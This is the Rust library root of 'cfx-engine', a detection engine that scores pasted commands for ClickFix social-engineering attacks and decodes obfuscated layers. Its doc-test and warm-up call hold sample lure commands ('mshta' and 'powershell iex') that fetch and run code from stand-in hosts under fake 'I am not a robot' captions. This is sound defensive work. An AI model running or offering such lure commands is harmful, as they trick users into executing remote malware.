//! # cfx-engine
//!
//! Pure, OS-independent ClickFix detection. No OS APIs, no I/O, no network.
//!
//! ```
//! use cfx_engine::{Engine, Observation, Origin, DomainClass, Target, Level};
//! let engine = Engine::default();
//! let obs = Observation::new("mshta https://c2.invalid/verify.mp4 # I am not a robot - reCAPTCHA Verification ID: 2165")
//!     .origin(Origin::Browser { url: None, domain_class: DomainClass::Unknown })
//!     .target(Target::RunDialog);
//! assert_eq!(engine.fast_path(&obs).level, Level::Block);
//! ```

pub mod allowlist;
pub mod deobfus;
pub mod features;
pub mod ioc;
pub mod rules;
pub mod score;
pub mod types;
mod util;

pub use allowlist::{AllowEntry, Allowlist, Tier};
pub use deobfus::{DecodeBudget, DecodeTrace, Decoder, Exhaustion, Pipeline};
pub use ioc::Iocs;
pub use rules::{FeatureClass, RuleSet};
pub use score::{Dampen, FeatureScore, Level, Multiplier, Verdict};
pub use types::{host_of, DomainClass, DomainClassifier, Observation, Origin, Target, UserRole};
pub use util::{has_interpreter_token, sha256_hex};

use serde::Serialize;
use std::time::Instant;

#[derive(Debug, thiserror::Error)]
pub enum EngineError {
    #[error("rules: {0}")]
    Rules(String),
    #[error("allowlist: {0}")]
    Allowlist(String),
}

/// Knobs used mainly by the evaluation harness for ablations.
#[derive(Debug, Clone, Copy)]
pub struct EngineConfig {
    pub allowlist_enabled: bool,
    pub deobfuscate: bool,
    /// Apply origin/target multipliers. Off = "typed command / no context" mode.
    pub use_context: bool,
    pub fast_budget: DecodeBudget,
    pub deep_budget: DecodeBudget,
    /// Input is truncated to this many bytes on the fast path.
    pub fast_max_input: usize,
    pub deep_max_input: usize,
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self {
            allowlist_enabled: true,
            deobfuscate: true,
            use_context: true,
            fast_budget: DecodeBudget::FAST,
            deep_budget: DecodeBudget::DEEP,
            fast_max_input: 64 * 1024,
            deep_max_input: 1024 * 1024,
        }
    }
}

pub struct Engine {
    rules: RuleSet,
    allowlist: Allowlist,
    pipeline: Pipeline,
    pub config: EngineConfig,
}

impl Default for Engine {
    fn default() -> Self {
        Self::from_toml(rules::DEFAULT_RULES, rules::DEFAULT_ALLOWLIST)
            .expect("embedded rules are valid")
    }
}

/// Signal 3 output: everything the analyst needs. Only produced for content worth
/// reporting; contains decoded payload text.
#[derive(Debug, Clone, Serialize)]
pub struct AnalysisReport {
    pub verdict: Verdict,
    pub layers: Vec<deobfus::Layer>,
    pub exhausted: Option<Exhaustion>,
    pub iocs: Iocs,
}

impl Engine {
    pub fn from_toml(rules_src: &str, allow_src: &str) -> Result<Self, EngineError> {
        let rules = RuleSet::from_toml(rules_src)?;
        let allowlist = Allowlist::from_toml(allow_src, &rules.feature_ids())?;
        let engine = Self {
            rules,
            allowlist,
            pipeline: Pipeline::default(),
            config: EngineConfig::default(),
        };
        // Warm the lazily compiled helper regexes (features, shapes, IOC) off the hot path.
        let _ = engine.analyze(&Observation::new(
            "powershell -c iex 'x' # I am not a robot verify https://a.invalid/x.mp4 eyJhbGciOiJub25lIn0.e30.",
        ));
        Ok(engine)
    }

    pub fn with_config(mut self, config: EngineConfig) -> Self {
        self.config = config;
        self
    }

    pub fn rules(&self) -> &RuleSet {
        &self.rules
    }

    pub fn allowlist(&self) -> &Allowlist {
        &self.allowlist
    }

    /// Signal 1: paste-time. Shallow decode within the fast budget, score, return.
    pub fn fast_path(&self, obs: &Observation) -> Verdict {
        self.run(obs, self.config.fast_budget, self.config.fast_max_input)
            .0
    }

    /// Fast path that also returns the decode trace (for alerting the decoded command).
    pub fn fast_path_traced(&self, obs: &Observation) -> (Verdict, DecodeTrace) {
        self.run(obs, self.config.fast_budget, self.config.fast_max_input)
    }

    /// Signal 3: post-hoc. Deep decode, no latency pressure, IOC extraction.
    pub fn analyze(&self, obs: &Observation) -> AnalysisReport {
        let (verdict, trace) = self.run(obs, self.config.deep_budget, self.config.deep_max_input);
        let raw = util::truncate(&obs.text, self.config.deep_max_input);
        let iocs =
            ioc::extract(std::iter::once(raw).chain(trace.layers.iter().map(|l| l.text.as_str())));
        AnalysisReport {
            verdict,
            layers: trace.layers,
            exhausted: trace.exhausted,
            iocs,
        }
    }

    fn run(
        &self,
        obs: &Observation,
        budget: DecodeBudget,
        max_input: usize,
    ) -> (Verdict, DecodeTrace) {
        let start = Instant::now();
        let text = util::truncate(&obs.text, max_input);
        let trace = if self.config.deobfuscate {
            self.pipeline.run(text, budget)
        } else {
            DecodeTrace::default()
        };

        let mut hits = features::evaluate_layer(&self.rules, text, 0);
        let mut interpreter_anywhere = util::has_interpreter_token(text);
        for (i, layer) in trace.layers.iter().enumerate() {
            hits.extend(features::evaluate_layer(&self.rules, &layer.text, i + 1));
            interpreter_anywhere |= util::has_interpreter_token(&layer.text);
        }

        let (level, score, base, warn_t, block_t, features, dampens, multipliers) =
            score::score(score::ScoreInput {
                rules: &self.rules,
                allowlist: self.config.allowlist_enabled.then_some(&self.allowlist),
                use_context: self.config.use_context,
                obs,
                hits,
                trace: &trace,
                interpreter_anywhere,
            });

        let verdict = Verdict {
            level,
            score,
            base,
            warn_threshold: warn_t,
            block_threshold: block_t,
            features,
            dampens,
            multipliers,
            decode_layers: trace.layers.iter().map(|l| l.decoders.clone()).collect(),
            needs_deep_analysis: trace.exhausted.is_some() || obs.text.len() > max_input,
            sha256: util::sha256_hex(obs.text.as_bytes()),
            elapsed: start.elapsed(),
        };
        (verdict, trace)
    }
}
